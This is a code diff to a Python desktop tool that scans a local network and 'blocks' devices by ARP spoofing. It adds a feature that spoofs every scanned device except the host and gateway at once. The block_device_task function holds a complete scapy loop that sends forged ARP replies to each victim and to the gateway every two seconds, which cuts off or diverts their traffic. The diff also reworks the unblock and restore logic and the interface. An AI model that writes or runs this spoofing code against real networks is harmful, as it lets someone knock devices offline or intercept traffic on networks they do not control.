@@ -12,7 +12,7 @@ import logging
 from collections import defaultdict
 import ipaddress  # Added for CIDR calculation
 import serial  # Added for ESP32 connection
-import serial.tools.list_ports  
+import serial.tools.list_ports  # Added for listing serial ports
 
 
 os.environ.pop("SSLKEYLOGFILE", None)
@@ -131,7 +131,7 @@ def scan_network(ip_range, iface=None):
     arp = ARP(pdst=ip_range)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
     packet = ether / arp
-    
+    # srp sends and receives layer 2 packets, timeout in seconds, verbose=0 means no output to console
     result = srp(packet, timeout=3, verbose=0, iface=iface)[0]  # Pass iface here
     devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
     return devices
@@ -154,7 +154,7 @@ def get_mac(ip, iface=None):
     return None
 
 
-def get_my_mac():
+def get_my_mac_global():
     """Retrieves the MAC address of the local machine's primary active interface."""
     interfaces = psutil.net_if_addrs()
     active_stats = psutil.net_if_stats()
@@ -168,7 +168,7 @@ def get_my_mac():
     return None
 
 
-def get_my_ip():
+def get_my_ip_global():
     """Retrieves the IPv4 address of the local machine's primary active interface."""
     interfaces = psutil.net_if_addrs()
     active_stats = psutil.net_if_stats()
@@ -207,10 +207,10 @@ class NetworkToolGUI:
         self.root.configure(fg_color=self.colors['bg'])
 
         # State variables for blocking
-        self.blocking_active = False
-        self.blocking_thread = None
-        self.blocked_device_ip = None
-        self.blocked_device_mac = None
+        self.blocking_active = False  # True if ANY blocking is happening
+        # {'ip': {'thread': Thread, 'event': Event, 'gateway_ip': str, 'target_mac': str, 'gateway_mac': str, 'interface': str}}
+        self.active_block_operations = {}
+        self.scanned_devices = []  # Store the last scanned devices
 
         # State variables for bandwidth monitoring
         self.bandwidth_monitor_active = False
@@ -229,10 +229,9 @@ class NetworkToolGUI:
         self.esp32_read_thread = None
         self.esp32_baud_rate = 115200  # Fixed baud rate for simplicity
 
-        # Local machine info
-        self.my_ip = get_my_ip()
-        self.my_mac = get_my_mac()
-        # self.active_interface_name is removed, using selected_interface_var
+        # Local machine info (general, not specific to selected interface)
+        self.my_ip_global = get_my_ip_global()
+        self.my_mac_global = get_my_mac_global()
 
         # Interface management variables
         self.all_interface_details = {}  # To store details from get_all_active_interfaces_details
@@ -360,26 +359,33 @@ class NetworkToolGUI:
                                       height=35)
         self.btn_scan.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
 
-        self.btn_monitor_bandwidth = ctk.CTkButton(action_buttons_frame, text="Start Bandwidth Monitor",
-                                                   command=self._start_stop_bandwidth_monitor,
-                                                   fg_color=self.colors['success'],
-                                                   hover_color=self.colors['success'],
-                                                   height=35)
-        self.btn_monitor_bandwidth.grid(row=1, column=0, sticky="ew", padx=5, pady=5)
+        # Added Block All button
+        self.btn_block_all = ctk.CTkButton(action_buttons_frame, text="Block All (Except Host/Gateway)",
+                                           command=self._start_block_all,
+                                           fg_color=self.colors['error'], hover_color=self.colors['error'],
+                                           height=35)
+        self.btn_block_all.grid(row=1, column=0, sticky="ew", padx=5, pady=5)
 
-        # Main Unblock/Stop Blocking button
+        # Original unblock all (now handles all active blocking)
         self.btn_unblock_all = ctk.CTkButton(action_buttons_frame, text="Unblock All Devices",
                                              command=self._start_unblock,
                                              fg_color=self.colors['warning'], hover_color=self.colors['warning'],
                                              height=35)
         self.btn_unblock_all.grid(row=1, column=1, sticky="ew", padx=5, pady=5)
 
+        self.btn_monitor_bandwidth = ctk.CTkButton(action_buttons_frame, text="Start Bandwidth Monitor",
+                                                   command=self._start_stop_bandwidth_monitor,
+                                                   fg_color=self.colors['success'],
+                                                   hover_color=self.colors['success'],
+                                                   height=35)
+        self.btn_monitor_bandwidth.grid(row=2, column=0, sticky="ew", padx=5, pady=5)
+
         # New Ping Device button
         self.btn_ping_device = ctk.CTkButton(action_buttons_frame, text="Ping Device",
                                              command=self._start_ping_test_dialog,
                                              fg_color=self.colors['accent'], hover_color=self.colors['accent_hover'],
                                              height=35)
-        self.btn_ping_device.grid(row=2, column=0, sticky="ew", padx=5, pady=5)
+        self.btn_ping_device.grid(row=2, column=1, sticky="ew", padx=5, pady=5)
 
         # New Refresh Interfaces button
         self.btn_refresh_interfaces = ctk.CTkButton(action_buttons_frame, text="Refresh Interfaces",
@@ -387,14 +393,14 @@ class NetworkToolGUI:
                                                     fg_color=self.colors['accent'],
                                                     hover_color=self.colors['accent_hover'],
                                                     height=35)
-        self.btn_refresh_interfaces.grid(row=2, column=1, sticky="ew", padx=5, pady=5)
+        self.btn_refresh_interfaces.grid(row=3, column=0, sticky="ew", padx=5, pady=5)
 
         # ESP32 Connect button
         self.btn_esp32_connect = ctk.CTkButton(action_buttons_frame, text="Connect to ESP32",
                                                command=self._start_esp32_connection,
                                                fg_color=self.colors['accent'], hover_color=self.colors['accent_hover'],
                                                height=35)
-        self.btn_esp32_connect.grid(row=3, column=0, sticky="ew", padx=5, pady=5)
+        self.btn_esp32_connect.grid(row=3, column=1, sticky="ew", padx=5, pady=5)
 
         # Status Indicator (Blocking and Bandwidth Monitor)
         self.blocking_status_label = ctk.CTkLabel(action_buttons_frame, text="Status: Idle",
@@ -530,60 +536,73 @@ class NetworkToolGUI:
         self.log_textbox.see("end")
         self.log_textbox.configure(state="disabled")
 
-    def _set_ui_busy_state(self, busy: bool, blocking_target_ip: str = None):
-        """
-        Sets the UI to a busy or idle state, with special handling for blocking.
-        If busy is True, UI elements are disabled. If busy is False, they are enabled.
-        When blocking_target_ip is provided, it specifically highlights the blocked device's button.
-        """
-        state = "disabled" if busy else "normal"
+    def _get_interface_details_for_selected(self):
+        """Returns the IP, MAC, and CIDR for the currently selected interface."""
+        selected_interface_name = self.selected_interface_var.get()
+        if selected_interface_name in self.all_interface_details:
+            details = self.all_interface_details[selected_interface_name]
+            return details['ip'], details['mac'], details['cidr']
+        return None, None, None
 
-        # General UI elements
-        self.btn_info.configure(state=state)
-        self.btn_scan.configure(state=state)
-        self.ip_entry.configure(state=state)
-        self.gateway_entry.configure(state=state)
-        self.btn_ping_device.configure(state=state)
-        self.interface_optionmenu.configure(state=state)
-        self.btn_refresh_interfaces.configure(state=state)
+    def _set_ui_busy_state(self, busy: bool):
+        """
+        Sets the UI to a busy or idle state, with special handling for concurrent operations.
+        If busy is True, most UI elements are disabled. If busy is False, they are enabled
+        based on the current state of blocking, bandwidth monitoring, and ESP32 connection.
+        """
+        # Determine the general state for buttons that are disabled during *any* operation
+        general_disabled = busy or self.blocking_active or self.bandwidth_monitor_active or self.esp32_connected
+        general_state = "disabled" if general_disabled else "normal"
+
+        self.btn_info.configure(state=general_state)
+        self.btn_scan.configure(state=general_state)
+        self.ip_entry.configure(state=general_state)
+        self.gateway_entry.configure(state=general_state)
+        self.btn_ping_device.configure(state=general_state)
+        self.interface_optionmenu.configure(state=general_state)
+        self.btn_refresh_interfaces.configure(state=general_state)
+
+        # Block All button state: disabled if blocking is active or other general busy state
+        self.btn_block_all.configure(state=general_state if not self.blocking_active else "disabled")
 
         # Bandwidth monitor button state
-        if busy:
+        if general_disabled and not self.bandwidth_monitor_active: # If busy but not BM itself, disable
             self.btn_monitor_bandwidth.configure(state="disabled")
-        elif self.bandwidth_monitor_active:
+        elif self.bandwidth_monitor_active: # If BM is active, allow stopping it
             self.btn_monitor_bandwidth.configure(state="normal", text="Stop Bandwidth Monitor",
                                                  fg_color=self.colors['error'], hover_color=self.colors['error'])
-        else:
+        else: # Not busy and BM not active, allow starting
             self.btn_monitor_bandwidth.configure(state="normal", text="Start Bandwidth Monitor",
                                                  fg_color=self.colors['success'], hover_color=self.colors['success'])
 
-        # Device-specific block buttons
-        for device_frame in self.devices_scroll_frame.winfo_children():
-            if hasattr(device_frame, 'block_button'):
-                if busy:
-                    if blocking_target_ip and device_frame.device_ip == blocking_target_ip:
-                        device_frame.block_button.configure(state="disabled", text="Blocking...")
-                    else:
-                        device_frame.block_button.configure(state="disabled")
-                else:
-                    if not self.blocking_active:
-                        device_frame.block_button.configure(state="normal", text="Block")
-                    elif self.blocking_active and device_frame.device_ip == self.blocked_device_ip:
-                        device_frame.block_button.configure(state="disabled", text="Blocking...")
-                    else:
-                        device_frame.block_button.configure(state="disabled")
-
-        # Unblock All/Stop Blocking button: always enabled if blocking is active
+        # Unblock All/Stop Blocking button: always enabled if blocking is active, otherwise follows general state
         if self.blocking_active:
-            self.btn_unblock_all.configure(state="normal", text="Stop Blocking", fg_color=self.colors['error'],
+            self.btn_unblock_all.configure(state="normal", text="Stop All Blocking", fg_color=self.colors['error'],
                                            hover_color=self.colors['error'])
         else:
-            self.btn_unblock_all.configure(state=state, text="Unblock All Devices", fg_color=self.colors['warning'],
+            self.btn_unblock_all.configure(state=general_state, text="Unblock All Devices", fg_color=self.colors['warning'],
                                            hover_color=self.colors['warning'])
 
         # ESP32 Connect button state - crucial for fix
-        # Pass busy state to allow _update_esp32_button_state to decide 'normal' or 'disabled'
-        self.root.after(0, lambda: self._update_esp32_button_state(ui_busy=busy))
+        self.root.after(0, lambda: self._update_esp32_button_state(ui_busy=busy)) # Pass general busy state
+
+        # Device-specific block buttons
+        my_ip, my_mac, _ = self._get_interface_details_for_selected()
+        gateway_ip = self.gateway_entry.get().strip()
+
+        for device_frame in self.devices_scroll_frame.winfo_children():
+            if hasattr(device_frame, 'block_button'):
+                device_ip = device_frame.device_ip
+                if device_ip == my_ip:
+                    device_frame.block_button.configure(state="disabled", text="Host", fg_color="gray", hover_color="gray")
+                elif device_ip == gateway_ip:
+                    device_frame.block_button.configure(state="disabled", text="Gateway", fg_color="gray", hover_color="gray")
+                elif device_ip in self.active_block_operations:
+                    device_frame.block_button.configure(state="disabled", text="Blocking...",
+                                                        fg_color=self.colors['error'], hover_color=self.colors['error'])
+                else:  # Not host, not gateway, not currently blocking
+                    device_frame.block_button.configure(state=general_state, text="Block",
+                                                        fg_color=self.colors['error'], hover_color=self.colors['error'])
 
         self.root.update_idletasks()
 
@@ -619,7 +638,9 @@ class NetworkToolGUI:
         manual_ip_range = self.ip_entry.get().strip()
         actual_ip_range = manual_ip_range  # Default to manually entered
 
-        if selected_interface != "Select an Interface" and selected_interface != "No active interfaces found":
+        if selected_interface == "Select an Interface" or selected_interface == "No active interfaces found":
+            self.gui_log_output("No interface selected. Attempting to use manual IP range.", "yellow")
+        else:
             interface_details = self.all_interface_details.get(selected_interface)
             if interface_details and interface_details['cidr'] != "N/A":
                 actual_ip_range = interface_details['cidr']
@@ -629,8 +650,6 @@ class NetworkToolGUI:
                 self.gui_log_output(
                     f"Selected interface {selected_interface} has no valid IPv4/CIDR. Falling back to manual IP range.",
                     "yellow")
-        else:
-            self.gui_log_output("No interface selected. Using manual IP range entry (if provided).", "blue")
 
         if not actual_ip_range:
             messagebox.showwarning("Cảnh báo", "Hãy nhập phạm vi IP hoặc chọn một giao diện để quét!")
@@ -652,7 +671,7 @@ class NetworkToolGUI:
             self.root.after(0, lambda: self.scan_progress_bar.set(0.1))
 
             devices = scan_network(ip_range, iface=scan_interface)  # Pass the interface to scan_network
-
+            self.scanned_devices = devices  # Store for block all
             self.gui_log_output(f"--- Found {len(devices)} Devices ---", "green")
             self.root.after(0, lambda: self.update_device_list(devices))
 
@@ -676,6 +695,7 @@ class NetworkToolGUI:
         self.scan_progress_bar.set(0)
         with self.bandwidth_lock:
             self.current_bytes_per_ip.clear()
+        self.scanned_devices = []  # Clear scanned devices too
 
     def update_device_list(self, devices):
         """Populates the devices_scroll_frame with scanned devices, including bandwidth labels."""
@@ -702,6 +722,9 @@ class NetworkToolGUI:
                      text_color=self.colors['text']).grid(row=0, column=2, sticky="w", padx=5)
         ctk.CTkLabel(header_frame, text="Action", font=ctk.CTkFont(weight="bold"), text_color=self.colors['text']).grid(
             row=0, column=3, sticky="w", padx=5)
+
+        current_host_ip, current_host_mac, _ = self._get_interface_details_for_selected()
+        gateway_ip = self.gateway_entry.get().strip()
 
         for i, device in enumerate(devices):
             device_frame = ctk.CTkFrame(self.devices_scroll_frame, fg_color=self.colors['card'], corner_radius=5)
@@ -734,22 +757,28 @@ class NetworkToolGUI:
             block_btn.grid(row=0, column=3, sticky="e", padx=5, pady=2)
 
             device_frame.block_button = block_btn
-            device_frame.device_ip = device['ip']
+            device_frame.device_ip = device['ip']  # Store IP on the frame for _set_ui_busy_state
+
+            # Special handling for host and gateway
+            if device['ip'] == current_host_ip:
+                block_btn.configure(text="Host", state="disabled", fg_color="gray", hover_color="gray")
+            elif device['ip'] == gateway_ip:
+                block_btn.configure(text="Gateway", state="disabled", fg_color="gray", hover_color="gray")
+            elif device['ip'] in self.active_block_operations:
+                block_btn.configure(text="Blocking...", state="disabled")
 
         self.root.after(0, lambda: self._set_ui_busy_state(False))
 
     def _start_block_from_list(self, ip_address, mac_address):
-        """Starts blocking a device selected from the list."""
-        if self.blocking_active:
-            messagebox.showwarning("Cảnh báo",
-                                   "Thiết bị khác đang bị chặn. Vui lòng bỏ chặn trước.")
-            self.gui_log_output("Cannot start new blocking, another is active.", "yellow")
+        """Starts blocking a single device selected from the list."""
+        if ip_address in self.active_block_operations:
+            messagebox.showwarning("Cảnh báo", f"Thiết bị {ip_address} đã bị chặn.")
+            self.gui_log_output(f"Device {ip_address} is already being blocked.", "yellow")
             return
 
         gateway_ip = self.gateway_entry.get().strip()
         if not gateway_ip:
-            messagebox.showwarning("Cảnh báo",
-                                   "Hãy nhập địa chỉ IP Gateway để chặn!")
+            messagebox.showwarning("Cảnh báo", "Hãy nhập địa chỉ IP Gateway để chặn!")
             return
 
         selected_interface = self.selected_interface_var.get()
@@ -758,120 +787,269 @@ class NetworkToolGUI:
             self.gui_log_output("Cannot start blocking: No valid interface selected.", "yellow")
             return
 
-        if not self.my_ip or not self.my_mac:
+        my_ip, my_mac, _ = self._get_interface_details_for_selected()
+        if not my_ip or not my_mac:
             messagebox.showerror("Lỗi",
-                                 "Không thể lấy địa chỉ IP/MAC cục bộ của bạn. Vui lòng thử lại hoặc kiểm tra kết nối mạng.")
-            self.gui_log_output("Failed to get local IP/MAC, cannot start blocking.", "red")
+                                 "Không thể lấy địa chỉ IP/MAC cục bộ của giao diện đã chọn. Vui lòng thử lại hoặc kiểm tra kết nối mạng.")
+            self.gui_log_output("Failed to get local IP/MAC for selected interface, cannot start blocking.", "red")
             return
 
-        self.blocked_device_ip = ip_address
-        self.blocked_device_mac = mac_address
+        if ip_address == my_ip:
+            messagebox.showwarning("Cảnh báo", "Không thể chặn thiết bị của chính bạn.")
+            self.gui_log_output("Attempted to block own device.", "red")
+            return
+        if ip_address == gateway_ip:
+            messagebox.showwarning("Cảnh báo", "Không thể chặn Gateway. Điều này sẽ làm mất mạng.")
+            self.gui_log_output("Attempted to block Gateway.", "red")
+            return
 
         self.gui_log_output(
             f"Attempting to block device - IP: {ip_address}, MAC: {mac_address} via Gateway: {gateway_ip} on interface {selected_interface}",
             "red")
-        self.blocking_active = True
-        self.blocking_thread = threading.Thread(target=self.block_device_task,
-                                                args=(ip_address, mac_address, gateway_ip, self.my_ip, self.my_mac,
-                                                      selected_interface),
-                                                daemon=True)
-        self.blocking_thread.start()
+
+        stop_event = threading.Event()
+        blocking_thread = threading.Thread(target=self.block_device_task,
+                                           args=(ip_address, mac_address, gateway_ip, my_mac,
+                                                 selected_interface, stop_event),
+                                           daemon=True)
+        self.active_block_operations[ip_address] = {
+            'thread': blocking_thread,
+            'event': stop_event,
+            'gateway_ip': gateway_ip,
+            'target_mac': mac_address,
+            'gateway_mac': None,  # Will be fetched in the task
+            'interface': selected_interface
+        }
+        blocking_thread.start()
+        self.blocking_active = True  # Set overall blocking status
 
         self.root.after(0, lambda: self.blocking_status_label.configure(text=f"Status: Blocking {ip_address}...",
                                                                         text_color=self.colors['error']))
-        self.root.after(0, lambda: self._set_ui_busy_state(True, ip_address))
+        self.root.after(0, lambda: self._set_ui_busy_state(False))  # Refresh UI elements
 
-    def block_device_task(self, ip_address, mac_address, gateway_ip, my_ip, my_mac, spoofing_interface):
-        """Task to continuously send ARP spoofing packets."""
-        try:
-            if ip_address == my_ip or mac_address == my_mac:
-                self.gui_log_output("Cannot block your own device.", "red")
-                logger.error("Attempted to block own device.")
-                return
-
-            gateway_mac = get_mac(gateway_ip, iface=spoofing_interface)  
-            if not gateway_mac:
-                self.gui_log_output("Could not find MAC address of gateway. Blocking failed.", "red")
-                logger.error(
-                    f"Could not find MAC for gateway {gateway_ip} on interface {spoofing_interface}. Blocking failed.")
-                return
-
-            self.gui_log_output(
-                f"Spoofing ARP for target ({ip_address}) and gateway ({gateway_ip}) on interface {spoofing_interface}...",
-                "red")
-            logger.warning(f"ARP spoofing started for {ip_address} via {gateway_ip} on interface {spoofing_interface}")
-
-            while self.blocking_active:
-                packet_victim = Ether(dst=mac_address) / ARP(op=2, pdst=ip_address, psrc=gateway_ip, hwdst=mac_address,
-                                                             hwsrc=my_mac)
-                packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address, hwdst=gateway_mac,
-                                                              hwsrc=my_mac)
-                sendp(packet_victim, verbose=0, iface=spoofing_interface)  # Specify interface
-                sendp(packet_gateway, verbose=0, iface=spoofing_interface)  # Specify interface
-                time.sleep(2)
-
-            self.gui_log_output(f"Blocking of device with IP {ip_address} has stopped.", "green")
-            logger.info(f"Blocking stopped for {ip_address}")
-
-        except Exception as e:
-            self.gui_log_output(f"Error during blocking: {e}", "red")
-            logger.critical(f"Critical error during blocking: {e}")
-        finally:
-            self.blocking_active = False
-            self.root.after(0, lambda: self._set_ui_busy_state(False))
-            self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Idle",
-                                                                            text_color=self.colors['text_dim']))
-            self.blocked_device_ip = None
-            self.blocked_device_mac = None
-
-    def _start_unblock(self):
-        """Initiates unblocking process in a separate thread."""
+    def _start_block_all(self):
+        """Starts blocking all scanned devices except the host and gateway."""
         if self.blocking_active:
-            self.gui_log_output(
-                f"Stopping active blocking for {self.blocked_device_ip if self.blocked_device_ip else 'unknown device'}...",
-                "yellow")
-            logger.warning(
-                f"User initiated stop for active blocking of {self.blocked_device_ip}")
-            self.blocking_active = False
-            self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Stopping Block...",
-                                                                            text_color=self.colors['warning']))
-            if self.blocking_thread and self.blocking_thread.is_alive():
-                self.blocking_thread.join(timeout=3)
-                if self.blocking_thread.is_alive():
-                    self.gui_log_output("Blocking thread did not stop gracefully.", "red")
-                    logger.error("Blocking thread did not stop gracefully.")
+            messagebox.showwarning("Cảnh báo", "Một hoạt động chặn đã diễn ra. Vui lòng bỏ chặn tất cả trước.")
+            self.gui_log_output("Cannot start 'Block All': some blocking is already active.", "yellow")
+            return
 
-        self.blocked_device_ip = None
-        self.blocked_device_mac = None
+        if not self.scanned_devices:
+            messagebox.showwarning("Cảnh báo", "Hãy quét mạng trước để có các thiết bị cần chặn.")
+            self.gui_log_output("Cannot start 'Block All': no devices have been scanned.", "yellow")
+            return
+
+        gateway_ip = self.gateway_entry.get().strip()
+        if not gateway_ip:
+            messagebox.showwarning("Cảnh báo", "Hãy nhập địa chỉ IP Gateway để chặn!")
+            return
 
         selected_interface = self.selected_interface_var.get()
         if selected_interface == "Select an Interface" or selected_interface == "No active interfaces found":
-            messagebox.showwarning("Cảnh báo", "Vui lòng chọn một giao diện để thực hiện bỏ chặn.")
-            self.gui_log_output("Cannot start unblocking: No valid interface selected.", "yellow")
+            messagebox.showwarning("Cảnh báo", "Vui lòng chọn một giao diện để thực hiện chặn.")
+            self.gui_log_output("Cannot start 'Block All': No valid interface selected.", "yellow")
+            return
+
+        my_ip, my_mac, _ = self._get_interface_details_for_selected()
+        if not my_ip or not my_mac:
+            messagebox.showerror("Lỗi",
+                                 "Không thể lấy địa chỉ IP/MAC cục bộ của giao diện đã chọn. Vui lòng thử lại hoặc kiểm tra kết nối mạng.")
+            self.gui_log_output("Failed to get local IP/MAC for selected interface, cannot start 'Block All'.", "red")
+            return
+
+        devices_to_block = []
+        for device in self.scanned_devices:
+            if device['ip'] != my_ip and device['ip'] != gateway_ip:
+                devices_to_block.append(device)
+
+        if not devices_to_block:
+            messagebox.showinfo("Thông báo", "Không tìm thấy thiết bị nào để chặn (ngoại trừ Host và Gateway).")
+            self.gui_log_output("No devices found to block (excluding Host and Gateway).", "yellow")
             return
 
         self._set_ui_busy_state(True)
-        self.gui_log_output("Attempting to unblock all devices...", "green")
-        threading.Thread(target=self.unblock_devices_task, args=(selected_interface,), daemon=True).start()
+        self.gui_log_output(f"Attempting to block {len(devices_to_block)} devices...", "red")
+        threading.Thread(target=self.block_all_devices_task,
+                         args=(devices_to_block, gateway_ip, my_mac, selected_interface),
+                         daemon=True).start()
 
-    def unblock_devices_task(self, unblocking_interface):
-        """Task to restore ARP tables for previously blocked devices."""
+    def block_all_devices_task(self, devices_to_block, gateway_ip, my_mac, spoofing_interface):
+        """Task to start blocking multiple devices."""
         try:
+            self.blocking_active = True
+            for device in devices_to_block:
+                ip_address = device['ip']
+                mac_address = device['mac']
+                if ip_address not in self.active_block_operations:  # Avoid double blocking
+                    stop_event = threading.Event()
+                    blocking_thread = threading.Thread(target=self.block_device_task,
+                                                       args=(ip_address, mac_address, gateway_ip, my_mac,
+                                                             spoofing_interface, stop_event),
+                                                       daemon=True)
+                    self.active_block_operations[ip_address] = {
+                        'thread': blocking_thread,
+                        'event': stop_event,
+                        'gateway_ip': gateway_ip,
+                        'target_mac': mac_address,
+                        'gateway_mac': None,  # Will be fetched in the task
+                        'interface': spoofing_interface
+                    }
+                    blocking_thread.start()
+                    self.gui_log_output(f"Started blocking thread for {ip_address}", "red")
+                    time.sleep(0.1)  # Small delay to not flood with threads immediately
+
+            self.root.after(0, lambda: self.blocking_status_label.configure(text=f"Status: Blocking {len(self.active_block_operations)} devices...",
+                                                                            text_color=self.colors['error']))
+            self.root.after(0, lambda: self._set_ui_busy_state(False))  # Refresh UI
+
+        except Exception as e:
+            self.gui_log_output(f"Error starting 'Block All' operation: {e}", "red")
+            logger.critical(f"Critical error during 'Block All' operation: {e}")
+            # In case of an error during startup, attempt to clean up any started threads
+            self.root.after(0, self._stop_all_blocking_internal)
+        finally:
+            self.root.after(0, lambda: self._set_ui_busy_state(False))  # Ensure UI is reset even on error
+
+    def block_device_task(self, target_ip, target_mac, gateway_ip, my_mac, spoofing_interface, stop_event):
+        """Task to continuously send ARP spoofing packets for a single device."""
+        try:
+            gateway_mac = get_mac(gateway_ip, iface=spoofing_interface)
+            if not gateway_mac:
+                self.gui_log_output(f"Could not find MAC address of gateway {gateway_ip}. Blocking {target_ip} failed.", "red")
+                logger.error(
+                    f"Could not find MAC for gateway {gateway_ip} on interface {spoofing_interface}. Blocking of {target_ip} failed.")
+                return
+
+            # Store gateway_mac for later unblocking
+            if target_ip in self.active_block_operations:
+                self.active_block_operations[target_ip]['gateway_mac'] = gateway_mac
+
+            self.gui_log_output(
+                f"Spoofing ARP for target ({target_ip}) and gateway ({gateway_ip}) on interface {spoofing_interface}...",
+                "red")
+            logger.warning(f"ARP spoofing started for {target_ip} via {gateway_ip} on interface {spoofing_interface}")
+
+            while not stop_event.is_set():
+                packet_victim = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac,
+                                                             hwsrc=my_mac)
+                packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac,
+                                                              hwsrc=my_mac)
+                sendp(packet_victim, verbose=0, iface=spoofing_interface)
+                sendp(packet_gateway, verbose=0, iface=spoofing_interface)
+                time.sleep(2)
+
+            self.gui_log_output(f"Blocking of device with IP {target_ip} has stopped.", "green")
+            logger.info(f"Blocking stopped for {target_ip}")
+
+        except Exception as e:
+            self.gui_log_output(f"Error during blocking of {target_ip}: {e}", "red")
+            logger.critical(f"Critical error during blocking of {target_ip}: {e}")
+        finally:
+            # Clean up the specific blocking operation from the list
+            if target_ip in self.active_block_operations:
+                del self.active_block_operations[target_ip]
+            self.root.after(0, self._check_and_update_global_blocking_status)  # Check if any blocking is still active
+
+    def _check_and_update_global_blocking_status(self):
+        """Checks if any blocking operations are still active and updates global status and UI."""
+        self.blocking_active = bool(self.active_block_operations)
+        if not self.blocking_active:
+            self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Idle",
+                                                                            text_color=self.colors['text_dim']))
+        else:
+            self.root.after(0, lambda: self.blocking_status_label.configure(text=f"Status: Blocking {len(self.active_block_operations)} devices...",
+                                                                            text_color=self.colors['error']))
+        self.root.after(0, lambda: self._set_ui_busy_state(False))  # Refresh UI elements
+
+    def _stop_all_blocking_internal(self):
+        """Internal function to stop all active blocking operations without user interaction."""
+        if not self.active_block_operations:
+            return
+
+        self.gui_log_output(f"Stopping {len(self.active_block_operations)} active blocking operations internally...", "yellow")
+
+        # Signal all active blocking threads to stop
+        for ip, op_details in list(self.active_block_operations.items()):
+            op_details['event'].set()
+
+        # Wait for threads to terminate
+        for ip, op_details in list(self.active_block_operations.items()):
+            if op_details['thread'].is_alive():
+                op_details['thread'].join(timeout=3)
+                if op_details['thread'].is_alive():
+                    self.gui_log_output(f"Blocking thread for {ip} did not terminate gracefully during internal stop.", "red")
+                    logger.error(f"Blocking thread for {ip} did not terminate gracefully during internal stop.")
+            # Even if it didn't terminate, remove from our tracking
+            if ip in self.active_block_operations:
+                del self.active_block_operations[ip]
+
+        self.blocking_active = False
+        self.root.after(0, self._check_and_update_global_blocking_status) # Update UI to reflect idle state
+
+
+    def _start_unblock(self):
+        """Initiates unblocking process for all currently blocked devices and restores ARP for known devices."""
+        if not self.blocking_active and not self.active_block_operations:
+            messagebox.showinfo("Thông báo", "Không có thiết bị nào đang bị chặn.")
+            self.gui_log_output("No devices are currently being blocked.", "blue")
+            # If no blocking is active, but UI might be in a busy state for some reason, ensure it's reset
+            self.root.after(0, lambda: self._set_ui_busy_state(False))
+            return
+
+        self.gui_log_output(
+            f"Stopping active blocking for {len(self.active_block_operations)} devices...",
+            "yellow")
+        logger.warning(f"User initiated stop for active blocking of {len(self.active_block_operations)} devices.")
+
+        self._set_ui_busy_state(True)  # Disable other UI elements while unblocking
+
+        # Signal all active blocking threads to stop
+        for ip, op_details in list(self.active_block_operations.items()):  # Iterate over a copy
+            op_details['event'].set()
+
+        # The actual removal from active_block_operations happens in block_device_task's finally block.
+        # We start the unblock task, which will handle waiting for threads and ARP restoration.
+        self.blocking_active = False # Global state is now False for the UI refresh
+
+        self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Stopping Block...",
+                                                                        text_color=self.colors['warning']))
+
+        threading.Thread(target=self.unblock_devices_task, daemon=True).start()
+
+    def unblock_devices_task(self):
+        """Task to restore ARP tables for all known devices."""
+        try:
+            selected_interface = self.selected_interface_var.get()
+            if selected_interface == "Select an Interface" or selected_interface == "No active interfaces found":
+                self.gui_log_output("Cannot unblock: No valid interface selected. Please select an interface.", "red")
+                messagebox.showerror("Lỗi", "Vui lòng chọn một giao diện để thực hiện bỏ chặn.")
+                return
+
             gateway_ip = self.gateway_entry.get().strip()
             if not gateway_ip:
                 self.gui_log_output("Gateway IP is required for unblocking. Please enter it in the field.", "red")
                 messagebox.showerror("Gateway IP Missing",
                                      "Please provide the Gateway IP in the input field to unblock devices.")
-                logger.error("Unblock failed: Gateway IP missing.")
                 return
 
-            if not self.my_ip or not self.my_mac:
+            my_ip, my_mac, _ = self._get_interface_details_for_selected()
+            if not my_ip or not my_mac:
                 messagebox.showerror("Lỗi",
-                                     "Không thể lấy địa chỉ IP/MAC cục bộ của bạn. Vui lòng thử lại hoặc kiểm tra kết nối mạng.")
-                self.gui_log_output("Failed to get local IP/MAC, cannot start unblocking.", "red")
+                                     "Không thể lấy địa chỉ IP/MAC cục bộ của giao diện đã chọn. Vui lòng thử lại hoặc kiểm tra kết nối mạng.")
+                self.gui_log_output("Failed to get local IP/MAC for selected interface, cannot perform unblocking.", "red")
                 return
 
-            devices_to_unblock = []
+            devices_to_restore = []
+            restored_ips = set()
+
+            # First, add devices from the last scan that are not host/gateway
+            for device in self.scanned_devices:
+                if device['ip'] not in restored_ips and device['ip'] != my_ip and device['ip'] != gateway_ip:
+                    devices_to_restore.append(device)
+                    restored_ips.add(device['ip'])
+
+            # Then, read from network_devices.txt for any other devices
+            devices_from_file = []
             try:
                 with open("network_devices.txt", "r") as file:
                     for line in file:
@@ -880,61 +1058,62 @@ class NetworkToolGUI:
                             ip_part = parts[0].split(': ')
                             mac_part = parts[1].split(': ')
                             if len(ip_part) == 2 and len(mac_part) == 2:
-                                devices_to_unblock.append({'ip': ip_part[1].strip(), 'mac': mac_part[1].strip()})
+                                devices_from_file.append({'ip': ip_part[1].strip(), 'mac': mac_part[1].strip()})
             except FileNotFoundError:
-                self.gui_log_output("No 'network_devices.txt' found. Cannot unblock devices.", "warning")
-                messagebox.showwarning("No Devices", "No 'network_devices.txt' found to unblock devices from.")
-                logger.warning("Unblock attempt failed: 'network_devices.txt' not found.")
-                return
+                self.gui_log_output("No 'network_devices.txt' found. Cannot unblock historical devices.", "warning")
 
-            if not devices_to_unblock:
-                self.gui_log_output("No devices found in 'network_devices.txt' to unblock.", "warning")
-                messagebox.showinfo("No Devices", "No devices were recorded in 'network_devices.txt' to unblock.")
-                logger.warning("No devices recorded in 'network_devices.txt' to unblock.")
+            for device in devices_from_file:
+                if device['ip'] not in restored_ips and device['ip'] != my_ip and device['ip'] != gateway_ip:
+                    devices_to_restore.append(device)
+                    restored_ips.add(device['ip'])
+
+            if not devices_to_restore:
+                self.gui_log_output("No non-host/gateway devices found in scan or history to unblock.", "blue")
+                messagebox.showinfo("Unblock", "Không có thiết bị nào (ngoại trừ Host và Gateway) cần khôi phục ARP.")
                 return
 
